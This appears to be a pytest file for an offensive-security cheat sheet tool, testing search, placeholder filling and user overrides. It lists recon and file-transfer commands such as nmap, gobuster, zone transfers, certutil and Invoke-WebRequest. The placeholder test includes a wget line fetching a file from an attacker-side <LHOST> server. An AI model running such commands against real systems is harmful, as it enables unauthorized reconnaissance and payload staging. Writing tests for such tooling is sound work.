"""Cheat sheet search, placeholder fill, and user overlays."""

import pytest

from spinneret.cheatsheet import (
    CheatsheetError,
    fill_placeholders,
    load_entries,
    parse_cheatsheet,
    search,
)


def test_bundled_sheet_covers_the_requested_commands() -> None:
    entries = load_entries()
    blob = "\n".join(entry.command for entry in entries)
    for snippet in (
        "nmap -sC -sV",
        "gobuster dir",
        "gobuster vhost",
        "ffuf",
        "dig axfr",
        "whatweb",
        "curl -sS",
        "wget",
        "certutil",
        "Invoke-WebRequest",
        "ToBase64String",
        "smbclient -N -L",
    ):
        assert snippet in blob
    assert len(entries) >= 20


def test_search_finds_zone_transfer_and_vhosts() -> None:
    entries = load_entries()
    axfr = search(entries, "axfr")
    assert axfr[0].id == "dig-axfr"
    vhost = search(entries, "vhost")
    ids = {entry.id for entry in vhost}
    assert "gobuster-vhost" in ids
    assert "ffuf-vhost" in ids
    assert search(entries, "zonetr")[0].id == "dig-axfr"
    assert search(entries, "no-such-command-xyz") == []
    assert search(entries, "") == entries


def test_placeholders_fill_from_the_box_and_leave_unknown_tokens() -> None:
    command = "wget http://<LHOST>:8000/<FILE> -O <FILE> && curl http://<IP>"
    filled = fill_placeholders(command, {"IP": "10.10.10.3", "LHOST": "10.10.14.5"})
    assert filled == "wget http://10.10.14.5:8000/<FILE> -O <FILE> && curl http://10.10.10.3"
    assert fill_placeholders("dig axfr <DOMAIN> @<IP>", {"IP": "10.10.10.3"}) == (
        "dig axfr <DOMAIN> @10.10.10.3"
    )


def test_user_file_overrides_by_id_and_appends(tmp_path) -> None:
    path = tmp_path / "cheatsheet.yaml"
    path.write_text(
        """
entries:
  - id: nmap-service
    title: Quiet service scan
    category: Nmap
    command: nmap -sV <IP>
  - id: local-note
    title: My alias
    category: Notes
    command: echo <BOX>
""",
        encoding="utf-8",
    )
    entries = load_entries([path])
    by_id = {entry.id: entry for entry in entries}
    assert by_id["nmap-service"].command == "nmap -sV <IP>"
    assert by_id["local-note"].command == "echo <BOX>"
    assert entries[-1].id == "local-note"


def test_broken_user_sheet_is_reported() -> None:
    with pytest.raises(CheatsheetError):
        parse_cheatsheet("entries: [1, 2]", source="user")
    with pytest.raises(CheatsheetError):
        parse_cheatsheet("{", source="user")
